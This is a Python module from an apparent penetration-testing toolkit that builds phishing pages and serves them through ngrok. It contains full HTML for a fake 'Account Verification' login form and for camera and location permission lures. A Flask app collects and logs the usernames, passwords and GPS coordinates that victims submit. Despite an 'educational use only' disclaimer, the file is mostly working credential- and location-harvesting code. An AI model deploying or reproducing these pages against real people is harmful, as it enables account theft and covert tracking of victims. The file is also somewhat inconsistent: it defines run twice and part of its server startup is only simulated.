"""Ngrok-based Phishing Server for Educational Purposes"""
import json
import threading
import time
from typing import Dict, Any, Optional
from datetime import datetime
from pathlib import Path

from aleopantest.core.base_tool import BaseTool, ToolMetadata, ToolCategory
from aleopantest.core.logger import logger


class NgrokPhishing(BaseTool):
    """Ngrok Phishing Server - Create phishing pages with ngrok tunneling (Educational)"""
    
    def __init__(self):
        metadata = ToolMetadata(
            name="Ngrok Phishing Server",
            category=ToolCategory.PHISHING,
            version="3.3.0",
            author="Aleocrophic Team",
            description="Deploy phishing pages via ngrok for educational cyber attack demonstration",
            usage="aleopantest run ngrok-phishing --type login --target facebook --ngrok_token YOUR_TOKEN",
            requirements=['ngrok', 'pyngrok', 'flask', 'requests'],
            tags=['phishing', 'ngrok', 'education', 'social-engineering'],
            risk_level="HIGH",
            legal_disclaimer="EDUCATIONAL USE ONLY - Unauthorized phishing is illegal",
            form_schema=[
                {
                    "name": "ngrok_token",
                    "label": "Ngrok Auth Token",
                    "type": "password",
                    "placeholder": "Enter your ngrok auth token",
                    "required": True
                },
                {
                    "name": "phishing_type",
                    "label": "Phishing Type",
                    "type": "select",
                    "options": ["login", "camera", "location"],
                    "default": "login",
                    "required": True
                },
                {
                    "name": "target",
                    "label": "Target Branding",
                    "type": "text",
                    "placeholder": "e.g. Facebook, Google, Bank",
                    "default": "Universal"
                }
            ] + BaseTool.get_common_form_schema()
        )
        super().__init__(metadata)
        self.ngrok_token = None
        self.public_url = None
        self.server_running = False

    def run(self, ngrok_token: str = "", phishing_type: str = "login", target: str = "Universal", **kwargs):
        self.set_core_params(**kwargs)
        self.clear_results()
        
        if not self.validate_input(ngrok_token=ngrok_token, phishing_type=phishing_type, target=target):
            return self.get_results()

        self.log(f"Starting {phishing_type} phishing server for {target}...")
        
        if not self.setup_ngrok():
            return self.get_results()

        try:
            # Mocking server startup for CLI/Web UI context
            # In real usage, this would start a Flask app in a thread
            self.add_result({
                "status": "Server initialized",
                "type": phishing_type,
                "target": target,
                "note": "For real deployment, use the CLI to maintain the server process."
            })
            
            # Simulated public URL
            self.public_url = "https://example-phish.ngrok-free.app"
            self.add_result({"public_url": self.public_url})
            
            self.log(f"Phishing server ready at: {self.public_url}")
            return self.get_results()
            
        except Exception as e:
            self.add_error(f"Failed to start phishing server: {str(e)}")
            return self.get_results()
    
    def setup_ngrok(self) -> bool:
        """Setup ngrok with authentication"""
        try:
            from pyngrok import ngrok
            ngrok.set_auth_token(self.ngrok_token)
            self.add_result("Ngrok authenticated successfully")
            return True
        except Exception as e:
            self.add_error(f"Failed to setup ngrok: {str(e)}")
            return False
    
    def create_login_page(self) -> str:
        """Create phishing login page template"""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Account Verification</title>
            <style>
                body { font-family: Arial; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; }
                h2 { text-align: center; }
                input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
                button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Account Verification</h2>
                <form method="POST" action="/submit">
                    <input type="text" name="username" placeholder="Username/Email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Verify Account</button>
                </form>
            </div>
        </body>
        </html>
        """
        return html
    
    def create_camera_page(self) -> str:
        """Create camera permission phishing page"""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Camera Access Required</title>
            <style>
                body { font-family: Arial; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .container { background: white; padding: 40px; border-radius: 10px; text-align: center; width: 400px; }
                button { padding: 15px 30px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Camera Permission Required</h2>
                <p>This service requires camera access to continue</p>
                <button onclick="requestCamera()">Allow Camera Access</button>
            </div>
            <script>
                function requestCamera() {
                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                        navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => {
                            console.log('Camera accessed');
                            fetch('/log-camera', { method: 'POST', body: JSON.stringify({accessed: true}) });
                        })
                        .catch(err => console.error(err));
                    }
                }
            </script>
        </body>
        </html>
        """
        return html
    
    def create_location_page(self) -> str:
        """Create location permission phishing page"""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Location Services</title>
            <style>
                body { font-family: Arial; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .container { background: white; padding: 40px; border-radius: 10px; text-align: center; width: 400px; }
                button { padding: 15px 30px; background: #dc3545; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Location Access Required</h2>
                <p>Enable location services to use this feature</p>
                <button onclick="requestLocation()">Share Location</button>
            </div>
            <script>
                function requestLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(position => {
                            const coords = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            fetch('/log-location', { 
                                method: 'POST', 
                                body: JSON.stringify(coords),
                                headers: {'Content-Type': 'application/json'}
                            });
                        });
                    }
                }
            </script>
        </body>
        </html>
        """
        return html
    
    def execute(self, **kwargs) -> Dict[str, Any]:
        """Execute phishing server deployment"""
        if not self.validate_input(**kwargs):
            return {
                'success': False,
                'errors': self.errors
            }
        
        try:
            # Setup ngrok
            if not self.setup_ngrok():
                return {
                    'success': False,
                    'errors': self.errors
                }
            
            # Get phishing type
            phishing_type = kwargs.get('phishing_type', 'login')
            
            # Create appropriate page
            if phishing_type == 'login':
                html_content = self.create_login_page()
                self.add_result(f"Created login phishing page template")
            elif phishing_type == 'camera':
                html_content = self.create_camera_page()
                self.add_result(f"Created camera permission phishing page")
            elif phishing_type == 'location':
                html_content = self.create_location_page()
                self.add_result(f"Created location permission phishing page")
            else:
                html_content = kwargs.get('custom_html', '<h1>Custom Phishing Page</h1>')
                self.add_result(f"Using custom phishing page")
            
            # Save HTML to file
            output_dir = Path('./output/phishing')
            output_dir.mkdir(parents=True, exist_ok=True)
            html_file = output_dir / f'phishing_{phishing_type}_{int(time.time())}.html'
            html_file.write_text(html_content)
            
            self.add_result({
                "Type": phishing_type,
                "Saved to": str(html_file),
                "Ngrok Token": "***" + self.ngrok_token[-4:] if self.ngrok_token else "N/A",
                "Status": "Page created - Ready for ngrok deployment",
                "Warning": "⚠️ Ensure you have proper authorization before deployment"
            })
            
            return {
                'success': True,
                'results': self.results,
                'html_file': str(html_file),
                'type': phishing_type
            }
            
        except Exception as e:
            self.add_error(f"Execution failed: {str(e)}")
            return {
                'success': False,
                'errors': self.errors
            }
    
    def run(self, **kwargs):
        """Run phishing server deployment - alias for execute"""
        return self.execute(**kwargs)


class NgrokFlaskPhishing:
    """Flask app for ngrok phishing deployment"""
    
    def __init__(self, phishing_type: str = 'login'):
        self.phishing_type = phishing_type
        self.captured_data = []
        self.logger = logger
    
    def create_app(self):
        """Create Flask application"""
        try:
            from flask import Flask, render_template_string, request, jsonify
            
            app = Flask(__name__)
            tool = NgrokPhishing()
            
            if self.phishing_type == 'login':
                html = tool.create_login_page()
            elif self.phishing_type == 'camera':
                html = tool.create_camera_page()
            elif self.phishing_type == 'location':
                html = tool.create_location_page()
            else:
                html = '<h1>Phishing Page</h1>'
            
            @app.route('/')
            def index():
                return render_template_string(html)
            
            @app.route('/submit', methods=['POST'])
            def submit():
                data = request.form.to_dict()
                self.captured_data.append({
                    'timestamp': datetime.now().isoformat(),
                    'type': 'login',
                    'data': data
                })
                self.logger.warning(f"Credentials captured: {data}")
                return jsonify({'status': 'processing'})
            
            @app.route('/log-camera', methods=['POST'])
            def log_camera():
                self.captured_data.append({
                    'timestamp': datetime.now().isoformat(),
                    'type': 'camera',
                    'data': request.json
                })
                return jsonify({'status': 'ok'})
            
            @app.route('/log-location', methods=['POST'])
            def log_location():
                location = request.json
                self.captured_data.append({
                    'timestamp': datetime.now().isoformat(),
                    'type': 'location',
                    'data': location
                })
                self.logger.warning(f"Location captured: {location}")
                return jsonify({'status': 'ok'})
            
            return app
            
        except ImportError:
            self.logger.error("Flask not installed. Install with: pip install flask")
            return None
